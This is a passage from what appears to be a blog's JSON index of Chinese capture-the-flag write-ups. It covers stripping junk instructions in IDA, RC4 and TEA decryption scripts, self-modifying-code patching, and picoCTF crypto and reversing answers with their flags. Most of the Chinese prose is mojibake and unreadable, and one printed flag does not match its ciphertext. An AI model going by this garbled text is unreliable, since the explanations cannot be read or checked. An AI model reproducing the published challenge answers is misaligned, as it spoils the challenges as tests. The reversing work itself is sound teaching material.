æŒ‡ä»¤è·³è½¬åˆ°ï¼Œä½†å®ƒæœ¬èº«ä¸æ˜¯ä¸€ä¸ªæœ‰æ„ä¹‰çš„æ‰§è¡Œè·¯å¾„ã€‚å®ƒçš„å­˜åœ¨æ˜¯ä¸ºäº†å¹²æ‰°åæ±‡ç¼–å™¨çš„çº¿æ€§åˆ†æï¼Œä½¿å…¶è®¤ä¸ºè¿™é‡Œå­˜åœ¨ä¸€ä¸ªå®é™…çš„ä»£ç åˆ†æ”¯ã€‚åæ±‡ç¼–å™¨å¯èƒ½ä¼šå°† 0C7h è§£ç ä¸º MOV EDI, EBP (å¦‚æœåŠ ä¸Šå‰ç¼€çš„è¯)ï¼Œæˆ–è€…åªæ˜¯ä¸€ä¸ªæ•°æ®å­—èŠ‚ï¼Œæ— è®ºå“ªç§ï¼Œéƒ½ä¸æ­£å¸¸é€»è¾‘ä¸ç¬¦ã€‚ ä¸ºäº†ä¸å½±å“æ±‡ç¼–å™¨çš„åˆ†æ è¦æŠŠè¿™é‡Œè¿›è¡Œåˆ¤æ–­å’Œè·³è½¬çš„éƒ½NOPæ‰ å°† push ebx å’Œ pop ebx éƒ½ NOP æ‰çš„ä¸»è¦åŸå› æ˜¯ä¸ºäº†å®Œå…¨æ¶ˆé™¤è¿™ä¸ªèŠ±æŒ‡ä»¤çš„å‰¯ä½œç”¨å’Œæ··æ·†é“¾ï¼š æ ˆå¹³è¡¡ï¼š push ebx å’Œ pop ebx æ˜¯ä¸€å¯¹ç”¨æ¥ç»´æŠ¤æ ˆå¹³è¡¡çš„æ“ä½œã€‚å¦‚æœå®ƒä»¬æ˜¯èŠ±æŒ‡ä»¤çš„ä¸€éƒ¨åˆ†ï¼Œå¹¶ä¸”å®ƒä»¬ä¿å­˜&#x2F;æ¢å¤çš„å¯„å­˜å™¨å€¼åœ¨ä¸­é—´è¢«ä¿®æ”¹ï¼ˆä¾‹å¦‚è¢« xor ebx, ebx æ¸…é›¶ï¼‰ï¼Œé‚£ä¹ˆè¿™å¯¹ push/pop å®é™…ä¸Šæ˜¯æ— æ•ˆçš„æˆ–è€…è¯´æ˜¯è¯¯å¯¼æ€§çš„ã€‚å®ƒä»¬çš„å­˜åœ¨åªæ˜¯ä¸ºäº†è®©ä»£ç çœ‹èµ·æ¥æ›´å¤æ‚ï¼Œæˆ–è€…åœ¨æŸäº›æƒ…å†µä¸‹é€šè¿‡ä¸åŒ¹é…çš„æ ˆæ“ä½œæ¥å¹²æ‰°åˆ†æã€‚ å¦‚æœåª NOP æ‰ä¸­é—´çš„è·³è½¬ï¼Œä¿ç•™ push ebx å’Œ pop ebxï¼Œé‚£ä¹ˆåœ¨ push ebx ä¹‹åï¼Œebx ç«‹å³è¢«æ¸…é›¶ï¼Œç„¶ååˆè¢« pop ebx æ¢å¤ã€‚è¿™å¯èƒ½ä¼šå¯¼è‡´ ebx çš„å€¼åœ¨å‡½æ•°ä¸­è¢«ä¸å¿…è¦åœ°æ”¹å˜å’Œæ¢å¤ï¼Œå³ä½¿å®ƒä¸æ˜¯çœŸæ­£éœ€è¦çš„ã€‚ ç¬¬äºŒä¸ªèŠ±æŒ‡ä»¤ æ‰§è¡Œ 0x401358: call loc_40135E: call æŒ‡ä»¤æœ¬èº«å ç”¨ 5 ä¸ªå­—èŠ‚ (E8 01 00 00 00)ã€‚ call æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€æ˜¯ 0x401358 + 5 = 0x40135Dã€‚ CPU å°† 0x40135D å‹å…¥æ ˆä¸­ã€‚æ­¤æ—¶ï¼Œ0x40135D å°±æ˜¯æ ˆé¡¶çš„è¿”å›åœ°å€ã€‚ CPU è·³è½¬åˆ° 0x40135E å¼€å§‹æ‰§è¡Œã€‚ æ‰§è¡Œ 0x40135E: db 36h: è¿™æ˜¯ä¸€ä¸ªæ•°æ®å­—èŠ‚ï¼Œä½†æ˜¯ CPU ä¼šå°è¯•å°†å…¶ä½œä¸ºæŒ‡ä»¤æ‰§è¡Œã€‚è¿™é€šå¸¸æ˜¯èŠ±æŒ‡ä»¤çš„æ··æ·†æ‰‹æ³•ï¼Œå®ƒå¯èƒ½ä¸ä¼šå¯¼è‡´å´©æºƒï¼Œè€Œæ˜¯ä½œä¸ºæ— æ•ˆæŒ‡ä»¤æ‰§è¡Œæˆ–è€…è¢«åç»­æŒ‡ä»¤è¦†ç›–ã€‚ å‡è®¾å®ƒè¢«æ‰§è¡Œäº†ï¼Œæˆ–è€…è¢«è·³è¿‡äº†ï¼Œç¨‹åºæµä¼šç»§ç»­åˆ° 0x40135Fã€‚ æ‰§è¡Œ 0x40135F: add dword ptr [esp], 8: è¿™æ¡æŒ‡ä»¤éå¸¸å…³é”®ã€‚ [esp] æŒ‡çš„æ˜¯æ ˆé¡¶çš„å†…å­˜åœ°å€ã€‚å½“å‰æ ˆé¡¶å­˜æ”¾çš„æ˜¯ 0x40135Dï¼ˆåŸå§‹è¿”å›åœ°å€ï¼‰ã€‚ add dword ptr [esp], 8 çš„ä½œç”¨æ˜¯ï¼šå°†æ ˆé¡¶å­˜æ”¾çš„é‚£ä¸ª dword å€¼ï¼ˆå³ 0x40135Dï¼‰åŠ ä¸Š 8ï¼Œç„¶åæŠŠç»“æœå†å†™å›æ ˆé¡¶ã€‚ æ‰€ä»¥ï¼Œæ ˆé¡¶çš„è¿”å›åœ°å€ä» 0x40135D å˜æˆäº† 0x40135D + 8 = 0x401365ã€‚ æ‰§è¡Œ 0x401362: retn: retn æŒ‡ä»¤ä¼šä»æ ˆé¡¶å¼¹å‡ºåœ°å€ã€‚ å®ƒå¼¹å‡ºçš„ä¸å†æ˜¯åŸå§‹çš„ 0x40135Dï¼Œè€Œæ˜¯è¢« add æŒ‡ä»¤ä¿®æ”¹åçš„ 0x401365ã€‚ CPU è·³è½¬åˆ° 0x401365 å¼€å§‹æ‰§è¡Œã€‚ åŸå§‹çš„è¿”å›åœ°å€æ˜¯ 0x40135Dã€‚å¦‚æœæ²¡æœ‰ä»»ä½• add æ“ä½œï¼Œretn ä¼šå›åˆ° 0x40135Dã€‚ ä½†æ˜¯ï¼Œadd dword ptr [esp], 8 å°†è¿”å›åœ°å€ä¿®æ”¹æˆäº† 0x401365ã€‚ è¿™æ„å‘³ç€å½“ retn æ‰§è¡Œæ—¶ï¼Œç¨‹åºä¼šç›´æ¥ä» 0x401365 å¼€å§‹æ‰§è¡Œï¼Œ æ‰€ä»¥ï¼Œadd dword ptr [esp], 8 çš„ä½œç”¨å°±æ˜¯äººä¸ºåœ°è°ƒæ•´äº† retn çš„ç›®æ ‡åœ°å€ï¼Œä½¿å…¶è·³è¿‡äº† 0x40135D åˆ° 0x401364ï¼ˆåŒ…å« 0x401364ï¼‰è¿™æ®µåŒºåŸŸï¼Œç›´æ¥è·³è½¬åˆ° 0x401365 å»æ‰§è¡Œã€‚ è¿™å°±æ˜¯è¿™ç§èŠ±æŒ‡ä»¤ç”¨äºæ··æ·†æ§åˆ¶æµçš„ä¸€ç§å¸¸è§æ‰‹æ³•ã€‚ æ‰€ä»¥NOPçš„èŒƒå›´åŒ…æ‹¬0x401364 ä¸ºä»€ä¹ˆæ˜¯èŠ±æŒ‡ä»¤ æ­£å¸¸æƒ…å†µä¸‹ï¼Œcall æŒ‡ä»¤ä¼šç›´æ¥è·³è½¬åˆ°è¢«è°ƒç”¨å‡½æ•°çš„å…¥å£ç‚¹ã€‚è¿™ä¸ªå…¥å£ç‚¹åº”è¯¥æ˜¯ä¸€æ¡åˆæ³•çš„å¯æ‰§è¡ŒæŒ‡ä»¤ã€‚ ä½†æ˜¯åœ¨è¿™é‡Œï¼Œå½“ call æŒ‡ä»¤è·³è½¬åˆ° 0x40135E æ—¶ï¼Œå®ƒé‡åˆ°çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯ db 36hã€‚ åæ±‡ç¼–å™¨å›°æƒ‘ï¼š é™æ€åæ±‡ç¼–å™¨åœ¨ 0x40135E çœ‹åˆ° db 36h æ—¶ï¼Œé€šå¸¸ä¼šè®¤ä¸ºè¿™æ˜¯æ•°æ®ï¼Œè€Œä¸æ˜¯ä»£ç ã€‚å®ƒå¯èƒ½å› æ­¤åœæ­¢å¯¹è¯¥åŒºåŸŸçš„ä»£ç åˆ†æï¼Œæˆ–è€…äº§ç”Ÿé”™è¯¯çš„è§£ç ã€‚ CPU è¡Œä¸ºï¼š CPU ä¼šå°è¯•å°† 36h ä½œä¸ºæŒ‡ä»¤æ¥è§£ç æ‰§è¡Œã€‚å¦‚å‰æ‰€è¿°ï¼Œ36h æ˜¯ä¸€ä¸ªæ®µè¶…è¶Šå‰ç¼€ï¼ˆSS:ï¼‰ã€‚CPU ä¼šå°è¯•å°†å…¶ä¸éšåçš„å­—èŠ‚ç»„åˆæˆä¸€æ¡æŒ‡ä»¤ã€‚ å¦‚æœ 36h åé¢è·Ÿç€çš„å­—èŠ‚ï¼ˆå³ add dword ptr [esp], 8 çš„å­—èŠ‚ç  83ï¼‰ä¸èƒ½ä¸ 36h å½¢æˆä¸€æ¡åˆæ³•çš„æŒ‡ä»¤ï¼Œæˆ–è€…å½¢æˆäº†ç¨‹åºå‘˜ä¸æœŸæœ›çš„æŒ‡ä»¤ï¼Œè¿™å°±ä¼šå¯¼è‡´ç¨‹åºè¡Œä¸ºå¼‚å¸¸æˆ–å´©æºƒã€‚ ç„¶è€Œï¼Œåœ¨æŸäº›å¤æ‚çš„æ··æ·†ä¸­ï¼Œå¯èƒ½ä¼šåˆ©ç”¨è¿™ç§å‰ç¼€çš„ç‰¹æ€§ï¼Œä½¿å¾—å¤„ç†å™¨åœ¨ç‰¹å®šä¸Šä¸‹æ–‡ä¸­èƒ½æ­£ç¡®æ‰§è¡Œï¼Œè€Œåæ±‡ç¼–å™¨å´éš¾ä»¥ç†è§£ã€‚ callèŠ±æŒ‡ä»¤è¯†åˆ« call ç›®æ ‡æ˜¯æ•°æ®å­—èŠ‚æˆ–éæŒ‡ä»¤åŒºã€‚ call åé¢ç´§è·Ÿæ•°æ®å®šä¹‰ã€‚ call ç›®æ ‡å†…éƒ¨æœ‰ add dword ptr [esp], N æ¥ä¿®æ”¹è¿”å›åœ°å€ã€‚ æœ€åä»¥ retn ç»“æŸï¼Œå¹¶ä¸” retn ä¹‹åçš„å­—èŠ‚å¯èƒ½ä¹Ÿæ˜¯æ··æ·†çš„ä¸€éƒ¨åˆ†ã€‚ è„šæœ¬1234567891011121314stae=0x00401006end=0x00401402 for i in range(stae, end+1): if get_wide_dword(i)== 0x01740275: patch_dword(i,0x90909090) patch_dword(i-4,0x90909090) patch_word(i+4,0x9090) patch_word(i-5,0x90) if get_wide_dword(i)== 0x000001E8: if get_wide_dword(i+4)== 0x8336E800: patch_dword(i,0x90909090) patch_dword(i+4,0x90909090) patch_dword(i+8,0x90909090) patch_byte(i+12,0x90) ç„¶åé€‰ä¸­å‡½æ•°å¤´Uè§£æ„ Cé‡æ„ä¸€ä¸‹å°±å¥½ å°±å¯ä»¥çœ‹å¾…mainå‡½æ•°äº† åœ¨è¿™ä¸ªå‡½æ•°ä¸­çœ‹åˆ°RC4çš„æ ‡å¿— ä¹‹åç»è¿‡ä¸€ä¸ªå¼‚æˆ– ç„¶åè¿›å…¥sub_40128Fè¿›è¡Œæ ¸éªŒ è¿™æ˜¯å…¶åŠ å¯†åçš„å€¼ å³é”® æå–æ•°æ® å¼‚æˆ–è„šæœ¬ 123456789101112131415161718192021222324252627a=[0x0000004D, 0xFFFFFFE6, 0x00000049, 0xFFFFFF95, 0x00000003, 0x0000002D, 0x0000002B, 0xFFFFFFBA, 0xFFFFFFEA, 0x0000006D, 0xFFFFFFFF, 0x00000059, 0x00000070, 0x00000000, 0x0000001B, 0xFFFFFFA9, 0x0000002C, 0xFFFFFFB0, 0x00000032, 0xFFFFFF98, 0x0000006F, 0xFFFFFF8C, 0x00000056, 0xFFFFFFA2, 0x0000004C, 0x00000079, 0x0000007F]for i in range(len(a)-1,-1,-1): a[i]^=a[(i+1)%len(a)] print(a[i], end=&#x27; &#x27;)decimal_numbers =ahex_output = []for num in decimal_numbers: unsigned_32bit_num = num &amp; 0xFFFFFFFF hex_str = hex(unsigned_32bit_num)[2:].upper().zfill(8) hex_output.append(&quot;0x&quot; + hex_str)for i in range(0, len(hex_output), 4): print(&quot;, &quot;.join(hex_output[i:i+4])) #åè¿›åˆ¶50 75 7 4294967205 4294967283 127 16 4294967176 4294967226 10 38 4294967183 4294967188 4294967188 4294967268 4294967229 66 47 4294967237 127 84 121 122 4294967279 4294967206 64 13 #åå…­è¿›åˆ¶0x0000000D, 0x00000040, 0xFFFFFFA6, 0xFFFFFFEF0x0000007A, 0x00000079, 0x00000054, 0x0000007F0xFFFFFFC5, 0x0000002F, 0x00000042, 0xFFFFFFBD0xFFFFFFE4, 0xFFFFFF94, 0xFFFFFF94, 0xFFFFFF8F0x00000026, 0x0000000A, 0xFFFFFFBA, 0xFFFFFF880x00000010, 0x0000007F, 0xFFFFFFF3, 0xFFFFFFA50x00000007, 0x0000004B, 0x00000032 â€‹ å¤„ç†RC4 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990def to_unsigned_32bit_and_byte(n): if n &lt; 0: n += 0x100000000 return n &amp; 0xFFdef to_signed_32bit(n): if n &gt; 0x7FFFFFFF: n -= 0x100000000 return ndef to_unsigned_32bit(n): if n &lt; 0: n += 0x100000000 return n &amp; 0xFFFFFFFF# --- RC4 é˜¶æ®µ 1: KSA (å¯†é’¥è°ƒåº¦ç®—æ³•) ---# å®šä¹‰: åˆå§‹åŒ– S ç›’å¹¶æ ¹æ®å¯†é’¥å¯¹å…¶è¿›è¡Œç½®æ¢ã€‚# è¾“å…¥: å¯†é’¥å­—èŠ‚ (key_bytes), å¯†é’¥é•¿åº¦æ¨¡æ•° (key_mod_len)# è¾“å‡º: ç»è¿‡åˆå§‹ç½®æ¢çš„ S ç›’ (s_box)def s_init(key_bytes, key_mod_len): s_box = list(range(256)) v4_ksa_t_box = [key_bytes[i % key_mod_len] for i in range(256)] j = 0 for i in range(256): j = (v4_ksa_t_box[i] + j + s_box[i]) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] return s_box# --- RC4 é˜¶æ®µ 2 &amp; 3: PRGA (ä¼ªéšæœºç”Ÿæˆç®—æ³•) &amp; æœ€ç»ˆæ•°æ®å¤„ç† ---# å®šä¹‰:# PRGA: æ ¹æ® S ç›’ç”Ÿæˆä¼ªéšæœºå¯†é’¥æµã€‚# æœ€ç»ˆæ•°æ®å¤„ç†: ä½¿ç”¨ç”Ÿæˆçš„å¯†é’¥æµå¯¹è¾“å…¥æ•°æ®è¿›è¡Œå¼‚æˆ–æ“ä½œã€‚# è¾“å…¥: å¾…å¤„ç†æ•°æ®æ•°ç»„ (data_array), å¯†é’¥å­—èŠ‚ (key_bytes), # å¯†é’¥é•¿åº¦æ¨¡æ•° (key_mod_len), æ•°æ®é•¿åº¦ (data_len)# è¾“å‡º: ç»è¿‡å¤„ç†åçš„æ•°æ®æ•°ç»„ (result_am_array)def rc4_variant_process(data_array, key_bytes, key_mod_len, data_len): # KSA é˜¶æ®µçš„è°ƒç”¨ s_box = s_init(key_bytes, key_mod_len) l = 0 v9 = 0 # ç”¨äºå­˜å‚¨ç”Ÿæˆçš„å¯†é’¥æµ generated_keystream = [0] * data_len # --- RC4 é˜¶æ®µ 2: PRGA (ç”Ÿæˆå¯†é’¥æµ) --- for k in range(data_len): l = (l + 3) % 256 v9 = (v9 + s_box[l] + 1) % 256 s_box[l], s_box[v9] = s_box[v9], s_box[l] generated_keystream[k] = s_box[(s_box[v9] + s_box[l]) % 256] # --- RC4 é˜¶æ®µ 3: æœ€ç»ˆæ•°æ®å¤„ç† (å¼‚æˆ–æ“ä½œ) --- result_am_array = list(data_array) for i in range(data_len): result_am_array[i] = to_signed_32bit(to_unsigned_32bit(result_am_array[i]) ^ to_unsigned_32bit(generated_keystream[i])) return result_am_arrayif __name__ == &quot;__main__&quot;: rc4_key_string = &#x27;Hello_Ctfers!!!&#x27; key_as_byte_list = list(map(ord, rc4_key_string)) if len(key_as_byte_list) &lt; 16: key_as_byte_list.append(0) KEY_MOD_LEN = 16 am_initial_hex = [ 0x0000000D, 0x00000040, 0xFFFFFFA6, 0xFFFFFFEF, 0x0000007A, 0x00000079, 0x00000054, 0x0000007F, 0xFFFFFFC5, 0x0000002F, 0x00000042, 0xFFFFFFBD, 0xFFFFFFE4, 0xFFFFFF94, 0xFFFFFF94, 0xFFFFFF8F, 0x00000026, 0x0000000A, 0xFFFFFFBA, 0xFFFFFF88, 0x00000010, 0x0000007F, 0xFFFFFFF3, 0xFFFFFFA5, 0x00000007, 0x0000004B, 0x00000032 ] am_initial_data = [to_signed_32bit(h) for h in am_initial_hex] n = len(am_initial_data) final_am_values = rc4_variant_process(am_initial_data, key_as_byte_list, KEY_MOD_LEN, n) output_chars = bytearray() for val in final_am_values: output_chars.append(to_unsigned_32bit_and_byte(val)) print(output_chars.decode(&#x27;latin-1&#x27;)) #NSSCTF&#123;Hn_CtF_w111_end_Lol&#125;","categories":[{"name":"exercise_re","slug":"exercise-re","permalink":"http://example.com/categories/exercise-re/"}],"tags":[{"name":"RE","slug":"RE","permalink":"http://example.com/tags/RE/"},{"name":"èŠ±æŒ‡ä»¤","slug":"èŠ±æŒ‡ä»¤","permalink":"http://example.com/tags/%E8%8A%B1%E6%8C%87%E4%BB%A4/"}]},{"title":"[HDCTF 2023]enc","slug":"HDCTF-2023-enc","date":"2025-07-11T11:35:05.000Z","updated":"2025-08-26T08:57:06.710Z","comments":true,"path":"2025/07/11/HDCTF-2023-enc/","permalink":"http://example.com/2025/07/11/HDCTF-2023-enc/","excerpt":"","text":"é“¾æ¥ æ‰“å¼€è¿›å…¥è¿™ä¸ªå‡½æ•° TEA åˆ†æä¹‹åçŸ¥é“ ä¸‹ä¸€æ­¥æ ¸å¯¹çš„v7å’Œv8éƒ½æ˜¯æ”¹å˜åçš„å¯†æ–‡ v9æ‰æ˜¯å¯†é’¥ è§£å¯†æ—¶æ³¨æ„ï¼Œå¼‚æˆ–çš„æ—¶å€™ä»åå¾€å‰å¼‚æˆ–ï¼Œå€’ç€æ¥ è„šæœ¬ 1234567891011121314151617#teaè§£å¯†def tea_decrypt(v, k): v0, v1 = v[0], v[1] delta = 0x61C88647 sum = -(delta * 32) &amp; 0xFFFFFFFF for _ in range(32): v1 = (v1 - ((16*v0 + k[2]) ^ (v0 + sum) ^((v0 &gt;&gt;5) + k[3]))) &amp; 0xFFFFFFFF v0 = (v0 - ((16*v1+ k[0]) ^ (v1 + sum) ^((v1 &gt;&gt;5) + k[1]))) &amp; 0xFFFFFFFF sum = (sum + delta) &amp; 0xFFFFFFFF return [v0, v1] # ç»™å®šå¯†æ–‡v9å’Œå¯†é’¥v10v9 = [0x60fcdef7,0x236dbec]v10 = [0x12,0x34,0x56,0x78]print(tea_decrypt(v9, v10))//key=3 SMCç»§ç»­çœ‹ä¸‹é¢çš„å‡½æ•° sub_4113DE â€”&gt;sub_414C10â€”&gt;sub_411046â€”&gt;sub_414B00â€”&gt;sub_411221â€”&gt;sub_415340 (char *)a1 æˆ– (_BYTE *)a1 æ˜¯å°†æ•´æ•°åœ°å€ a1 è½¬æ¢ä¸ºå†…å­˜æŒ‡é’ˆã€‚ ç„¶åé€šè¿‡ *ptr ^= a3 ä¿®æ”¹è¯¥åœ°å€ä¸Šçš„å†…å®¹ã€‚ æ‰€ä»¥æ˜¯SMC é‚£ä¸‹ä¸€æ­¥å°±æ˜¯æ‰¾åˆ°å®ƒæ”¹å˜çš„åœ°å€çš„èŒƒå›´ æ‰“å¼€x32xdbg ctrl+gè¾“å…¥00415340 F9è¿è¡Œåä¼šåœåœ¨è¿™é‡Œ æ‰€ä»¥ä¿®æ”¹ä½ç½®çš„ä½ç½®å¤´æ˜¯0x0041D000 é•¿åº¦æ˜¯0x600 æ‰€ä»¥åœ¨idaä¸­è¿è¡Œè„šæœ¬ è„šæœ¬ 1234567891011121314151617# å¯¼å…¥ ida_bytes æ¨¡å—ï¼Œè¿™æ˜¯ç°ä»£ IDA Python æ¨èçš„å­—èŠ‚æ“ä½œæ–¹å¼from ida_bytes import get_byte, patch_byte # å®šä¹‰æ“ä½œçš„èµ·å§‹åœ°å€ã€ç»“æŸåœ°å€å’Œå¼‚æˆ–å¯†é’¥start_address = 0x41d000end_address = 0x41E600 # rangeå‡½æ•°ä¸åŒ…å«end_addressxor_key = 3 print(&quot;å¼€å§‹æ‰¹é‡å¼‚æˆ–ä¿®æ”¹...&quot;)# éå†æŒ‡å®šèŒƒå›´å†…çš„æ¯ä¸ªå­—èŠ‚å¹¶è¿›è¡Œå¼‚æˆ–æ“ä½œfor i in range(start_address, end_address): original_byte = get_byte(i) # ä½¿ç”¨ get_byte ä» ida_bytes æ¨¡å—è¯»å–å­—èŠ‚ new_byte = original_byte ^ xor_key patch_byte(i, new_byte) # ä½¿ç”¨ patch_byte ä» ida_bytes æ¨¡å—å†™å…¥å­—èŠ‚print(&quot;ä¿®æ”¹å®Œæˆ&quot;) ä¹‹åå†åœ¨å‡½æ•°å¤´æŒ‰Uç»“æ„ å†é€‰ä¸­èŒƒå›´å»C å°±å¯ä»¥äº† å‘ç°æ˜¯RC4åŠ å¯† è„šæœ¬ 12345678910111213141516171819202122232425262728293031323334key=list(&#x27;you_are_master&#x27;)content=[0xf,0x94,0xae,0xf2,0xc0,0x57,0xc2,0xe0,0x9a,0x45,0x37,0x50,0xf5,0xa0,0x5e,0xcb,0x2c,0x16,0x28,0x29,0xfe,0xff,0x33,0x46,0xe,0x57,0x82,0x22,0x52,0x26,0x2b,0x6e,0xe4,0x82,0x24]rc4number=0x100s=[0]*rc4numberflag=&#x27;&#x27; def rc4_init(s,key,rc4number): for i in range(rc4number): s[i]=i j=0 for i in range(rc4number): j=(j+s[i]+ord(key[i%len(key)]))%rc4number temp=s[i] s[i]=s[j] s[j]=temp def rc4_endecode(s,content,rc4number): i=0 j=0 for k in range(len(content)): i=(i+1)%rc4number j=(j+s[i])%rc4number temp=s[i] s[i]=s[j] s[j]=temp t=(s[i]+s[j])%rc4number content[k]=chr(content[k]^s[t]) content=&#x27;&#x27;.join(content) print(content) rc4_init(s,key,rc4number)rc4_endecode(s,content,rc4number)","categories":[{"name":"exercise_re","slug":"exercise-re","permalink":"http://example.com/categories/exercise-re/"}],"tags":[{"name":"RE","slug":"RE","permalink":"http://example.com/tags/RE/"},{"name":"TEA","slug":"TEA","permalink":"http://example.com/tags/TEA/"},{"name":"SMC","slug":"SMC","permalink":"http://example.com/tags/SMC/"}]},{"title":"picoCTF2022","slug":"picoCTF2022","date":"2025-07-10T04:06:13.000Z","updated":"2025-08-26T09:12:57.292Z","comments":true,"path":"2025/07/10/picoCTF2022/","permalink":"http://example.com/2025/07/10/picoCTF2022/","excerpt":"","text":"CRYPTOVigenereé¢˜ç›®ä¿¡æ¯ key CYLAB cipher: rgnoDVD&#123;O0NU_WQ3_G1G3O3T3_A1AH3S_cc82272b&#125; é¢˜ç›®ç»™äº†å¯†æ–‡å’Œå¯†é’¥ï¼Œç”¨éšæ³¢é€æµæ‰“å¼€ï¼Œè§£å¯†ï¼Œå‘ç°æ˜¯ç»´å‰å°¼äºšåŠ å¯† flag:picoCTF{D0NT_US3_V1G3N3R3_C1PH3R_ae82272q} basic-mod1é¢˜ç›®ä¿¡æ¯ æè¿°ï¼š æˆ‘ä»¬å‘ç°è¿™ä¸ªå¥‡æ€ªçš„æ¶ˆæ¯åœ¨æœåŠ¡å™¨ä¸Šä¼ é€’ï¼Œæˆ‘ä»¬è®¤ä¸ºæˆ‘ä»¬æœ‰ä¸€ä¸ªæœ‰æ•ˆçš„ decrpytion æ–¹æ¡ˆã€‚å–æ¯ä¸ªæ•°å­— mod 37 å¹¶å°†å…¶æ˜ å°„åˆ°ä»¥ä¸‹å­—ç¬¦é›†ï¼š0-25 æ˜¯å­—æ¯è¡¨ï¼ˆå¤§å†™ï¼‰ï¼Œ26-35 æ˜¯åè¿›åˆ¶æ•°å­—ï¼Œ36 æ˜¯ä¸‹åˆ’çº¿ã€‚ä»¥ picoCTF æ ‡å¿—æ ¼å¼åŒ…è£…è§£å¯†çš„æ¶ˆæ¯ï¼ˆå³ picoCTF{decrypted_message}ï¼‰ æ•°å­—ï¼š350 63 353 198 114 369 346 184 202 322 94 235 114 110 185 188 225 212 366 374 261 213 æŒ‰ç…§é¢˜ç›®ä¿¡æ¯å¯¹å–æ¨¡åšçš„æ•°å­—æ ¹æ®å…¶ASCLLç ä¿®æ”¹ï¼Œå¹¶è½¬åŒ–ä¸ºå­—ç¬¦è¾“å‡º 123456789101112131415161718def simplify_numbers(numbers): result = [] for num in numbers: remainder = num % 37 if 0 &lt;= remainder &lt;= 25: result.append(chr(ord(&#x27;A&#x27;) + remainder)) elif 26 &lt;= remainder &lt;= 35: result.append(str(remainder - 26)) elif remainder == 36: result.append(&#x27;_&#x27;) else: result.append(f&quot;[&#123;remainder&#125;]&quot;) return &quot;&quot;.join(result)my_numbers = [350, 63, 353, 198, 114, 369, 346, 184, 202, 322, 94, 235, 114, 110, 185, 188, 225, 212, 366, 374, 261, 213]simplified_string = simplify_numbers(my_numbers)print(simplified_string) flagï¼špicoCTF{R0UND_N_R0UND_ADD17EC2} substitution0é¢˜ç›®ä¿¡æ¯ æè¿°ï¼š ä¸€æ¡æ¶ˆæ¯è¿›æ¥äº†ï¼Œä½†ä¼¼ä¹å…¨éƒ½ä¹±ä¸ƒå…«ç³Ÿã€‚å¹¸è¿çš„æ˜¯ï¼Œå®ƒä¼¼ä¹ä¸€å¼€å§‹å°±æœ‰é’¥åŒ™ã€‚ä½ èƒ½ç ´è§£è¿™ä¸ªæ›¿æ¢å¯†ç å—ï¼Ÿ å¯†æ–‡ï¼š OHNFUMWSVZLXEGCPTAJDYIRKQB Suauypcg Xuwaogf oacju, rvds o waoiu ogf jdoduxq ova, ogf hacywsd eu dsu huudxumace o wxojj noju vg rsvns vd roj ugnxcjuf. Vd roj o huoydvmyx jnoaohouyj, ogf, oddsod dveu, yglgcrg dc godyaoxvjdjâ€”cm ncyaju o wauod pavbu vg o jnvugdvmvn pcvgdcm ivur. Dsuau ruau drc acygf hxonl jpcdj guoa cgu ukdauevdq cm dsu honl, ogf oxcgw cgu guoa dsu cdsua. Dsu jnoxuj ruau uknuufvgwxq soaf ogf wxcjjq, rvds oxx dsuoppuoaognu cm hyagvjsuf wcxf. Dsu ruvwsd cm dsu vgjund roj iuaq aueoalohxu, ogf,dolvgw oxx dsvgwj vgdc ncgjvfuaodvcg, V ncyxf soafxq hxoeu Zypvdua mca svj cpvgvcgaujpundvgw vd. Dsu mxow vj: pvncNDM&#123;5YH5717Y710G_3I0XY710G_03055505&#125; è§£å¯† çŒœæµ‹å¯†é’¥å‡¯æ’’å¯†ç åŠ å¯†ï¼ŒæŠŠç¬¬ä¸€å¥ä½œä¸ºå¯†é’¥ flag; picoCTF{5UB5717U710N_3V0LU710N_03055505} RESafe Openeré¢˜ç›®ä¿¡æ¯ æè¿°ï¼šä½ èƒ½æ‰“å¼€è¿™ä¸ªä¿é™©ç®±å—ï¼Ÿæˆ‘å¿˜è®°äº†ä¿é™©ç®±çš„é’¥åŒ™ï¼Œä½†è¿™ä¸ªç¨‹åºåº”è¯¥å¯ä»¥å¸®åŠ©æˆ‘æ‰¾å›ä¸¢å¤±çš„é’¥åŒ™ã€‚ä½ èƒ½å¸®æˆ‘æ‰“å¼€ä¿é™©ç®±å—ï¼Ÿå°†æ‚¨æ¢å¤çš„å¯†ç æ”¾å…¥ picoCTF æ ‡å¿—æ ¼å¼ï¼Œä¾‹å¦‚ï¼špicoCTF{password} ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142import java.io.*;import java.util.*; public class SafeOpener &#123; public static void main(String args[]) throws IOException &#123; BufferedReader keyboard = new BufferedReader(new InputStreamReader(System.in)); Base64.Encoder encoder = Base64.getEncoder();//Base6çš„ç¼–ç å™¨ String encodedkey = &quot;&quot;; String key = &quot;&quot;; int i = 0; boolean isOpen; while (i &lt; 3) &#123; System.out.print(&quot;Enter password for the safe: &quot;); key = keyboard.readLine(); encodedkey = encoder.encodeToString(key.getBytes());//å¯¹å¯†ç è¿›è¡ŒBase64åŠ å¯† System.out.println(encodedkey); isOpen = openSafe(encodedkey);//è°ƒç”¨æ–¹æ³•è¿›è¡Œæ ¸å¯¹ if (!isOpen) &#123; System.out.println(&quot;You have &quot; + (2 - i) + &quot; attempt(s) left&quot;); i++; continue; &#125; break; &#125; &#125; public static boolean openSafe(String password) &#123; String encodedkey = &quot;cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz&quot;;//BASE64åŠ å¯†åçš„ç»“æœ if (password.equals(encodedkey)) &#123; System.out.println(&quot;Sesame open&quot;); return true; &#125; else &#123; System.out.println(&quot;Password is incorrect\\n&quot;); return false; &#125; &#125;&#125; æ­£å¦‚ä»£ç ä¸­çš„æ³¨é‡Šä¸€æ ·ï¼Œç”¨æˆ·è¾“å…¥å¯†ç ï¼Œè¿›è¡ŒBase64ç¼–ç ï¼Œè°ƒç”¨å‡½æ•°æ£€éªŒç¼–ç åšçš„æ•°å€¼æ˜¯å¦ç¬¦åˆæŒ‡å®šå­—ç¬¦ï¼Œæ‰€ä»¥å¯†ç å°±æ˜¯æŒ‡å®šå­—ç¬¦Base64è§£ç  flagï¼špicoCTF{pl3as3_l3t_m3_1nt0_th3_saf3} GDB testé¢˜ç›®ä¿¡æ¯ ä½ 